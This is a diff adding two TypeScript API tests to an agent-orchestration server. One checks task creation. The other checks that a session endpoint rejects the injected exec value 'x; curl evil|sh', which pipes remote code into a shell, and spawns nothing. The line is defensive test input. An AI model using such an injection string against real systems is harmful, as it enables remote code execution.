@@ -47,6 +47,39 @@ describe('api', () => {
   });
 });
 
+it('POST /tasks with body {title} generates an id and sets status open', async () => {
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const tasks = new TaskStore(db);
+  const app = createServer({
+    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
+    engine: null as any, spawn: null as any, tmux: null as any,
+    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' },
+  });
+  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'From UI' }) });
+  expect(res.status).toBe(201);
+  const created = await res.json() as { id: string; title: string; status: string };
+  expect(created.title).toBe('From UI');
+  expect(created.status).toBe('open');
+  expect(created.id).toBeTruthy();
+  const list = await (await app.request('/tasks')).json() as Array<{ title: string }>;
+  expect(list.some(t => t.title === 'From UI')).toBe(true);
+});
+
+it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
+  const tmux = new FakeTmuxDriver();
+  const app = createServer({
+    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
+    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
+    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' },
+  });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'x; curl evil|sh' }) });
+  expect(res.status).toBe(400);
+  expect(await res.json()).toMatchObject({ error: 'invalid exec' });
+  expect(await tmux.list()).toHaveLength(0);
+});
+
 it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
   const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
   const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
